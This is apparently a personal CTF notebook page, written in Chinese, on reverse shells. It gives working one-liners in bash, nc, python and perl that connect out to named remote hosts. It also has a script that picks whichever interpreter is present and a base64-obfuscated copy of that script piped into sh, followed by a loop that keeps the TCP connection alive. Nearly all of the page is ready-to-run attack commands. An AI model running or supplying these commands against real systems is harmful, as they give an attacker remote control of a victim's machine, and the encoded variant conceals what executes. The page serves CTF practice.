- [[CTF/Shell/WAF绕过]]
- [[CTF/Shell/WAF示例]]
-
- # 反弹 shell
	- 让目标连接上我们的服务器，从而控制目标的shell
	- ```shell
	  bash -c "bash -i >& /dev/tcp/ca.xxx.xyz/3001 0>&1"
	  nc -e /bin/bash example.com 3003
	  nc example.com 3003 -e /bin/bash # 有时需要放在后面
	  ```
		- 别人的[CheatSheet](https://cn-sec.com/tools/Reverse-shell.html)
		- 自动判断环境：
			- ```shell
			  if command -v python > /dev/null 2>&1; then
			    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("nu.quietwing.ml",3003)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
			    exit;
			  fi
			  
			  if command -v perl > /dev/null 2>&1; then
			    perl -e 'use Socket;$i="nu.quietwing.ml";$p=3003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
			    exit;
			  fi
			  
			  if command -v nc > /dev/null 2>&1; then
			    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc nu.quietwing.ml 3003 >/tmp/f
			    exit;
			  fi
			  
			  if command -v sh > /dev/null 2>&1; then
			    /bin/sh -i >& /dev/tcp/nu.quietwing.ml/3003 0>&1
			    exit;
			  fi
			  ```
			- ```shell
			  echo aWYgY29tbWFuZCAtdiBweXRob24gPiAvZGV2L251bGwgMj4mMTsgdGhlbgogIHB5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgibnUucXVpZXR3aW5nLm1sIiwzMDAzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycKICBleGl0OwpmaQoKaWYgY29tbWFuZCAtdiBwZXJsID4gL2Rldi9udWxsIDI+JjE7IHRoZW4KICBwZXJsIC1lICd1c2UgU29ja2V0OyRpPSJudS5xdWlldHdpbmcubWwiOyRwPTMwMDM7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307JwogIGV4aXQ7CmZpCgppZiBjb21tYW5kIC12IG5jID4gL2Rldi9udWxsIDI+JjE7IHRoZW4KICBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyBudS5xdWlldHdpbmcubWwgMzAwMyA+L3RtcC9mCiAgZXhpdDsKZmkKCmlmIGNvbW1hbmQgLXYgc2ggPiAvZGV2L251bGwgMj4mMTsgdGhlbgogIC9iaW4vc2ggLWkgPiYgL2Rldi90Y3AvbnUucXVpZXR3aW5nLm1sLzMwMDMgMD4mMQogIGV4aXQ7CmZpCg== | base64 -d | sh
			  ```
- # 一直产生垃圾数据，保持TCP连接
	- ```shell
	  (while true; do cat /proc/sys/kernel/random/uuid; sleep 1; done) &
	  ```